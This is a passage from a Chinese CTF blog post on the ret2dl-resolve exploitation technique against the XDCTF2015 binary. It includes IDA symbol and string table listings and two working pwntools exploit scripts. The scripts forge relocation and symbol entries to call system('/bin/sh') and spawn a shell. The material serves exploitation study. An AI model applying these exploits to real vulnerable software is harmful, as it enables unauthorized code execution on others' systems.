+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">080481</span>D8 ; ELF Symbol Table</span><br><span class="line">LOAD:<span class="number">080481</span>D8                 Elf32_Sym &lt;<span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">080481E8</span>                 Elf32_Sym &lt;offset aSetbuf - offset byte_8048278, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;setbuf&quot;</span></span><br><span class="line">LOAD:<span class="number">080481F</span>8                 Elf32_Sym &lt;offset aRead - offset byte_8048278, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;read&quot;</span></span><br><span class="line">LOAD:<span class="number">08048208</span>                 Elf32_Sym &lt;offset aGmonStart - offset byte_8048278, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__gmon_start__&quot;</span></span><br><span class="line">LOAD:<span class="number">08048218</span>                 Elf32_Sym &lt;offset aStrlen - offset byte_8048278, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;strlen&quot;</span></span><br><span class="line">LOAD:<span class="number">08048228</span>                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_8048278, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, \ ; <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">LOAD:<span class="number">08048228</span>                            <span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">08048238</span>                 Elf32_Sym &lt;offset aWrite - offset byte_8048278, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;write&quot;</span></span><br><span class="line">LOAD:<span class="number">08048248</span>                 Elf32_Sym &lt;offset aStdout - offset byte_8048278, \ ; <span class="string">&quot;stdout&quot;</span></span><br><span class="line">LOAD:<span class="number">08048248</span>                            offset <span class="built_in">stdout</span>@@GLIBC_2_0, <span class="number">4</span>, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">1</span>Ah&gt;</span><br><span class="line">LOAD:<span class="number">08048258</span>                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_8048278, \ ; <span class="string">&quot;_IO_stdin_used&quot;</span></span><br><span class="line">LOAD:<span class="number">08048258</span>                            offset _IO_stdin_used, <span class="number">4</span>, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">10</span>h&gt;</span><br><span class="line">LOAD:<span class="number">08048268</span>                 Elf32_Sym &lt;offset aStdin - offset byte_8048278, \ ; <span class="string">&quot;stdin&quot;</span></span><br><span class="line">LOAD:<span class="number">08048268</span>                            offset <span class="built_in">stdin</span>@@GLIBC_2_0, <span class="number">4</span>, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">1</span>Ah&gt;</span><br></pre></td></tr></table></figure>
+<p>offset = 0x08048238 - 0x080481D8 = 0x60<br>str_name对应ELF String Table,如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">08048278</span> ; ELF String Table</span><br><span class="line">LOAD:<span class="number">08048278</span> byte_8048278    db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">080481E8</span>↑o</span><br><span class="line">LOAD:<span class="number">08048278</span>                                         ; LOAD:<span class="number">080481F</span>8↑o ...</span><br><span class="line">LOAD:08048279 aLibcSo6        db &#x27;libc.so.6&#x27;,0        ; DATA XREF: LOAD:080482F8↓o</span><br><span class="line">LOAD:08048283 aIoStdinUsed    db &#x27;_IO_stdin_used&#x27;,0   ; DATA XREF: LOAD:08048258↑o</span><br><span class="line">LOAD:08048292 aStdin          db &#x27;stdin&#x27;,0            ; DATA XREF: LOAD:08048268↑o</span><br><span class="line">LOAD:08048298 aStrlen         db &#x27;strlen&#x27;,0           ; DATA XREF: LOAD:08048218↑o</span><br><span class="line">LOAD:0804829F aRead           db &#x27;read&#x27;,0             ; DATA XREF: LOAD:080481F8↑o</span><br><span class="line">LOAD:080482A4 aStdout         db &#x27;stdout&#x27;,0           ; DATA XREF: LOAD:08048248↑o</span><br><span class="line">LOAD:080482AB aSetbuf         db &#x27;setbuf&#x27;,0           ; DATA XREF: LOAD:080481E8↑o</span><br><span class="line">LOAD:080482B2 aLibcStartMain  db &#x27;__libc_start_main&#x27;,0</span><br><span class="line">LOAD:<span class="number">080482B</span>2                                         ; DATA XREF: LOAD:<span class="number">08048228</span>↑o</span><br><span class="line">LOAD:080482C4 aWrite          db &#x27;write&#x27;,0            ; DATA XREF: LOAD:08048238↑o</span><br><span class="line">LOAD:080482CA aGmonStart      db &#x27;__gmon_start__&#x27;,0   ; DATA XREF: LOAD:08048208↑o</span><br><span class="line">LOAD:080482D9 aGlibc20        db &#x27;GLIBC_2.0&#x27;,0        ; DATA XREF: LOAD:08048308↓o</span><br><span class="line">LOAD:<span class="number">080482E3</span>                 align <span class="number">4</span></span><br></pre></td></tr></table></figure>
+<p>str_name =  0x080482C4 - 08048278 = 0x4c<br>write的对应的sym值是0x607，0x60为即为sym中的偏移<br>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi; pop edi; pop ebp; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># leave; ret</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> </span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = <span class="number">0x20</span></span><br><span class="line">fake_offset = base_stage + <span class="number">28</span> - rel_plt</span><br><span class="line">write_got = <span class="number">0x804A01C</span> <span class="comment">#elf.got[&#x27;write&#x27;]</span></span><br><span class="line">base_sym = <span class="number">0x080481D8</span></span><br><span class="line">fake_sym = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - (fake_sym - base_sym)%<span class="number">16</span> <span class="comment">#计算差值，保证16位对齐，</span></span><br><span class="line">fake_r_info = ((((fake_sym - base_sym + align)/<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">7</span>) </span><br><span class="line">fake_write = flat(p32(write_got),p32(fake_r_info))</span><br><span class="line">fake_sym_con=flat(p32(<span class="number">0x4c</span>),p32(<span class="number">0</span>),p32(<span class="number">0</span>),p32(<span class="number">0x12</span>))</span><br><span class="line">payload2 = flat(<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0) <span class="comment">#call plt_0</span></span><br><span class="line">, fake_offset</span><br><span class="line">, <span class="string">&#x27;aaaa&#x27;</span> <span class="comment">#返回地址</span></span><br><span class="line">, p32(<span class="number">1</span>)</span><br><span class="line">, p32(base_stage + <span class="number">80</span>) <span class="comment">#这三个p32为write的参数</span></span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">,fake_write</span><br><span class="line">,<span class="string">&quot;aaaa&quot;</span></span><br><span class="line">,fake_sym_con</span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * (<span class="number">40</span>-<span class="built_in">len</span>(fake_sym_con))</span><br><span class="line">, cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-伪造str-name"><a href="#5-伪造str-name" class="headerlink" title="5.伪造str_name"></a>5.伪造str_name</h3><p>伪造r_info后,就可以进一步伪造str_name,即上面payload的p32(0x4c)，因为_dl_fixup是根据字符串名来索引函数，如果<br>把write换成system，就能getshell了<br>ELF symble table的基地址为08048278，write的偏移为0x4c,思路就很清晰了,计算bss段上伪造的str_name的地址与0x08048278的差，然后替换0x4c(需要注意参数)，就可以getshell了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi; pop edi; pop ebp; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># leave; ret</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">, p32(read_plt)</span><br><span class="line">, p32(ppp_ret)</span><br><span class="line">, p32(<span class="number">0</span>)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(<span class="number">100</span>)</span><br><span class="line">, p32(pop_ebp_ret)</span><br><span class="line">, p32(base_stage)</span><br><span class="line">, p32(leave_ret))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> </span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = <span class="number">0x20</span></span><br><span class="line">fake_offset = base_stage + <span class="number">28</span> - rel_plt</span><br><span class="line">write_got = <span class="number">0x804A01C</span> <span class="comment">#elf.got[&#x27;write&#x27;]</span></span><br><span class="line">base_sym = <span class="number">0x080481D8</span></span><br><span class="line">fake_sym = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - (fake_sym - base_sym)%<span class="number">16</span> </span><br><span class="line">fake_r_info = ((((fake_sym - base_sym + align)//<span class="number">16</span>) &lt;&lt; <span class="number">8</span>) | <span class="number">7</span>) </span><br><span class="line">fake_write = flat(p32(write_got),p32(fake_r_info))</span><br><span class="line">test1 = base_stage + <span class="number">56</span> - <span class="number">0x08048278</span></span><br><span class="line">fake_sym_con=flat(p32(test1),p32(<span class="number">0</span>),p32(<span class="number">0</span>),p32(<span class="number">0x12</span>))</span><br><span class="line">fake_sym_con += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 = flat(<span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">, p32(plt_0) <span class="comment">#call plt_0</span></span><br><span class="line">, fake_offset <span class="comment">#0x20，</span></span><br><span class="line">, p32(<span class="number">1</span>) <span class="comment">#返回地址</span></span><br><span class="line">, p32(base_stage + <span class="number">80</span>)  <span class="comment">#system函数的参数</span></span><br><span class="line">, p32(base_stage + <span class="number">80</span>)</span><br><span class="line">, p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">,fake_write</span><br><span class="line">,<span class="string">&quot;aaaa&quot;</span></span><br><span class="line">,fake_sym_con</span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * (<span class="number">40</span>-<span class="built_in">len</span>(fake_sym_con))</span><br><span class="line">, cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">, <span class="string">&#x27;A&#x27;</span> * <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="NO-relro的情况"><a href="#NO-relro的情况" class="headerlink" title="NO relro的情况"></a>NO relro的情况</h3><p>当没有relro保护时，</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ret2dl/" rel="tag"># ret2dl</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/08/09/capplab3/" rel="next" title="attacklab">
+                <i class="fa fa-chevron-left"></i> attacklab
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiquanmuhua.github.io/" title="muhua" target="_blank">muhua</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xiquanmuhua.github.io/" title="tianmai" target="_blank">tianmai</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://makabaka-yyds.github.io/" title="makabaka" target="_blank">makabaka</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lucifer-rossweisse.github.io/" title="Rossweisse" target="_blank">Rossweisse</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lemonprefect.cn/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A-PLT"><span class="nav-number">1.1.</span> <span class="nav-text">延迟绑定(PLT)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dl-fixup"><span class="nav-number">1.2.</span> <span class="nav-text">_ dl_fixup</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="nav-number">2.</span> <span class="nav-text">实验内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="nav-number">2.1.</span> <span class="nav-text">1.搭建环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BC%AA%E9%80%A0%E6%A0%88%EF%BC%8C%E8%B0%83%E7%94%A8write"><span class="nav-number">2.2.</span> <span class="nav-text">2.伪造栈，调用write</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E4%BC%AA%E9%80%A0reloc-arg"><span class="nav-number">2.3.</span> <span class="nav-text">3.伪造reloc_arg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E4%BC%AA%E9%80%A0r-info"><span class="nav-number">2.4.</span> <span class="nav-text">4.伪造r_info</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E4%BC%AA%E9%80%A0str-name"><span class="nav-number">2.5.</span> <span class="nav-text">5.伪造str_name</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NO-relro%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">2.6.</span> <span class="nav-text">NO relro的情况</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Archer</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" rel="external nofollow noopener" target="_blank" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Gemini
+  </a>
+**  <span id="busuanzi_container_site_pv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+  <span id="busuanzi_container_site_uv" class="theme-info">
+&nbsp;&nbsp;|&nbsp;&nbsp;本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+**
+</div>
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("LbPELecNVT4mCuCTYHSU2wzm-gzGzoHsz", "iRokzKJjxE22Vs6iknD1dqGA");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
